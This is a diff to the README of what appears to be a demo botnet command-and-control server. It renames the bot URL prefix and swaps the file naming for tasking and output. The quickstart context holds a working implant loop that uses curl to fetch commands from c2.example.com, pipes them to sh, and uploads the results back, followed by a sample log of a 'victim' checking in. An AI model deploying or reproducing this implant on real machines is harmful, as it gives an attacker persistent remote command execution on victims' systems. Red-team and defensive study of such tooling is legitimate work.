@@ -35,7 +35,7 @@ Quickstart
            "address": "127.0.0.1:4433",
            "PID": 62063,
            "directory": "demobotnet",
-           "prefix": "/demobotnet/"
+           "prefix": "/bots/"
    }
    ```
 3. TLS is self-signed.  Use the fingerprint and URL prefix from the first log
@@ -47,7 +47,7 @@ Quickstart
            --max-time 10 \
            --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
            --silent \
-           https://c2.example.com:4433/demobotnet/$(hostname)-$$ |
+           https://c2.example.com:4433/bots/$(hostname)-$$ |
    sh 2>&1 |
    curl \
            --insecure \
@@ -55,7 +55,7 @@ Quickstart
            --pinnedpubkey sha256//Pj3k5tQFBQyDmXFeS79j2t/qU0WClx5qKI2DsaZn7AE= \
            --silent \
            --upload-file - \
-           https://c2.example.com:4433/demobotnet/$(hostname)-$$ ) &
+           https://c2.example.com:4433/bots/$(hostname)-$$ ) &
    sleep 10
    done
    ```
@@ -72,7 +72,7 @@ Quickstart
                     "remote_address": "10.135.2.240:39398",
                     "method": "PUT",
                     "host": "c2.example.com:4433",
-                    "request_uri": "/demobotnet/victim.com-1234",
+                    "request_uri": "/bots/victim.com-1234",
                     "user_agent": "curl/8.14.1"
             },
             "id": "victim-1234"
@@ -100,8 +100,8 @@ Demo-grade botnet controller.
 - Comms over HTTP, GET for tasking, POST/PUT for output.
 - URL path must have the right prefix, last component is bot ID.
 - IDs must be [A-Za-z0-9-.]+
-- Tasking goes into files named after the bots' IDs.
-- Output will go to files named after the bots' IDs plus _out.
+- Tasking goes into files named after the bots' IDs plus _task.
+- Output will go to files named after the bots' IDs.
 - TLS Fingerprint (for --pinnedpubkey) is in _tls_fingerprint.
 
 Options:
@@ -114,5 +114,5 @@ Options:
   -max-runtime duration
     	Maximum run duration
   -prefix string
-    	HTTP path prefix for bots (default "/demobotnet")
+    	HTTP URL path prefix for bots (default "/bots")
 ```
